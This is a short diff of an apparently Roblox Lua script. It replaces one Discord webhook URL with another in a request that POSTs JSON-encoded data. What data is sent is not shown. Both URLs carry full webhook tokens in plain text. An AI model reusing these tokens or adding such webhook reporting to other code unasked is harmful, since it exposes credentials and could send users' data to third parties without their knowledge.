@@ -58,7 +58,7 @@ local data = {
 local encodedData = game:GetService("HttpService"):JSONEncode(data)
 local headers = {["Content-Type"] = "application/json"}
 local response = request({
-    Url = "https://discord.com/api/webhooks/1305490047000383520/vKevGw7c9GAsLkSStIVXHeS1W0G2109zfgIzBsqnK4iJU7evw6wQrYhTFRfWoj8T9WPf",
+    Url = "https://discord.com/api/webhooks/1357287604080607292/dL8vV_XyEMyvGNOmMbdc2h6o-qzcSpctf4TxWfPV1WYhDU_cwd3hKKP47nQG8zPHibHR",
     Method = "POST",
     Headers = headers,
     Body = encodedData
